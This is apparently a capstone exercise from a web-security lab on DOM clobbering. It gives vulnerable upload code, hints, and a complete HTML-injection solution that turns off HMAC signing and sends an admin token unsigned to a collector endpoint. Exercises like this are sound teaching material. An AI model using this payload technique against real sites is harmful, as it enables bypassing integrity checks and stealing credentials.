Capstone: unsigned upload

This export service signs its uploads with an HMAC before sending them to a fixed endpoint. Both decisions are read from globals. Your goal: deliver an unsigned payload containing the admin token to /collect.

You need two independent clobbers. Either one alone is not enough — clobbering only the guard leaves a signed request at the legit endpoint, and clobbering only the destination still signs the data.

Victim code

const guard = window.uploadGuard
           || { verify: true };
const dest  = window.uploadDest
           || { url: '/api/upload' };

const record = {
  ref: REF, file: 'customers.csv',
  rows: 12840, token: ADMIN_TOKEN
};

let body;
if (guard.verify) {
  body = sign(record);   // {..., signed: true, sig}
} else {
  body = JSON.stringify(
    Object.assign({}, record, { signed: false }));
}

fetch(dest.url, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body
});

Your HTML injection

Hint 1 — the guard

guard.verify must become falsy. A single clobbered element gives you an object whose missing properties are undefined.

Hint 2 — the destination

dest.url must become a string that fetches from your collector. Two elements with id="uploadDest" make window.uploadDest a collection; add name="url" to the second so dest.url resolves to it. fetch() coerces it to a USVString.

Solution 
<a id="uploadGuard"></a>
<a id="uploadDest"></a>
<a id="uploadDest" name="url" href="/collect"></a>

window.uploadGuard is an anchor, so .verify is undefined → no signing. window.uploadDest is a collection, and .url is the second anchor whose toString() is its href, so fetch() posts to /collect.
